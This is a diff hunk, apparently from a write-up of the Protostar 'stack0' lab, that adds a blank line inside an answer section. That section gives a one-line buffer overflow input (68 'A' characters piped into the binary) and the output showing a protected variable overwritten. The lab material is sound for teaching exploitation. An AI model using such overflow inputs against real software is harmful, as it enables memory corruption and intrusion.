@@ -59,6 +59,7 @@
 
 ### Answer
     $ python -c 'print "A"*68' | ./stack0
+    
     you have changed the 'modified' variable
 
     
